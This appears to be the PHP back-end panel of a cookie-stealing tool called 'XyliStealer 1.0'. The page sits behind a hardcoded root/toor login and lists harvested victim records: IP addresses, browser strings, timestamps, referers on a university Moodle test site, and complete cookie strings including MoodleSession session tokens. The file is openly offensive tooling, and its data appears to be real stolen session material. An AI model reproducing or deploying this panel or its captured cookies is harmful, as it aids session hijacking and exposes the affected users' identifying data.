<?php /*
__   __      _ _ _____ _             _             __   _____
\ \ / /     | (_)  ___| |           | |           /  | |  _  |
 \ V / _   _| |_\ `--.| |_ ___  __ _| | ___ _ __  `| | | |/' |
 /   \| | | | | |`--. \ __/ _ \/ _` | |/ _ \ '__|  | | |  /| |
/ /^\ \ |_| | | /\__/ / ||  __/ (_| | |  __/ |    _| |_\ |_/ /
\/   \/\__, |_|_\____/ \__\___|\__,_|_|\___|_|    \___(_)___/
        __/ |
       |___/     By Xylitol
*/ ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Style-Type" CONTENT="text/css">
<meta name="robots" content="index, follow, all" />
<meta name="description" content="XyliStealer 1.0" />
<meta name="keywords" content="XyliStealer 1.0" />
<meta name="author" CONTENT="Xylitol">
<style type="text/css">
<!--
body,td,th {
	color: #0f0f0f;
}
body {
	background-color: #fcfcfc;
}
.Style1 {
	color: #ffffff;
	font-weight: bold;
}
-->
</style></head>
<body>
<table width="535" border="1" align="center">
</table>
<p>&nbsp;</p>
<p><?php
$LOGIN="root";  //login
$PASSWD="toor";   //password
if ($_POST['logintext']==$LOGIN && $_POST['passwdtext']==$PASSWD) {  ?>
<html>
<body>
<p><br />
Cookies:</p>
<table width="726" border="1">
<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
<tr><td>77.138.65.173</td><td>77.138.65.173</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0</td><td>21/03/2018</td><td>21:40:15</td><td>http://moodle-test.tau.ac.il/my/</td><td>_dy_ses_load_seq=10866%3A1521644932650; _dy_c_exps=; _dy_soct=31921.38566.1521644932; MoodleSession=j1efjsibmf19srdqq0l03ie3s6; _gat_atkit=1; _ga=GA1.3.864854784.1521624329; _gid=GA1.3.1115469121.1521624329</td></tr>
<tr><td>194.90.7.17</td><td>194.90.7.17</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0</td><td>22/03/2018</td><td>07:27:06</td><td>http://moodle-test.tau.ac.il/my/</td><td>_ga=GA1.3.864854784.1521624329; _gid=GA1.3.1115469121.1521624329; _dy_ses_load_seq=10866%3A1521644932650; _dy_c_exps=; _dy_soct=31921.38566.1521644932; MoodleSession=denseist9kpu2umpks2v752id7; _gat_atkit=1</td></tr>
<tr><td>194.90.7.17</td><td>194.90.7.17</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0</td><td>22/03/2018</td><td>07:28:16</td><td>Unspecified</td><td>_ga=GA1.3.864854784.1521624329; _gid=GA1.3.1115469121.1521624329; _dy_ses_load_seq=10866%3A1521644932650; _dy_c_exps=; _dy_soct=31921.38566.1521644932; MoodleSession=denseist9kpu2umpks2v752id7; _gat_atkit=1</td></tr>
<!-- Breakpoint -->
</table>
<p>&nbsp;</p>
<table width="535" border="1" align="center">
</table>
</body>
</html>
<?php } else { ?>
<html>
<body>
<p>Log in to continue</p>
<form name="connexion" action="<?php echo ($_SERVER['PHP_SELF']); ?>" method="post">
  <table width="298" border="1">
<tr>
        <td width="102">Login :</td>
      <td width="180"><input name="logintext" type="text" size="30" maxlength="30" /></td>
      </tr>
      <tr>
        <td>Password :</td>
        <td><input name="passwdtext" type="text" size="30" maxlength="30" /></td>
      </tr>
    </table>
  <table width="298" border="0">
    <tr>
      <td><div align="center">
        <input name="envoi" type="submit" value="-= Connect =-" />
      </div></td>
    </tr>
  </table>
  </form>
  <p>&nbsp;</p>
<table width="535" border="1" align="center">
</table>
</body>
</html>
<?php } ?>
